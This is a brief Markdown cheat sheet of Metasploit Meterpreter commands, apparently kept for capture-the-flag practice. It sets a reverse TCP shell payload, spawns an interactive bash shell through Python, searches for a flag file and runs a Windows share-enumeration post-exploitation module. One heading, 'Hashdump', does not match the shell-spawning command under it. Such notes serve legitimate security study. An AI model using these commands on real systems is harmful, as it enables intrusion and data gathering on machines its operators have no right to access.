# Meterpreter

#### Payload
```bash 
set payload linux/x86/meterpreter/reverse_tcp
```

#### Hashdump
```bash
run `python -c 'import pty;pty.spawn("/bin/bash")'`
```

#### Search
```bash
search -f flag.txt
```

#### Enum Shares Post Exploitation
```bash
background
use post/windows/gather/enum_shares
set session session_id
```

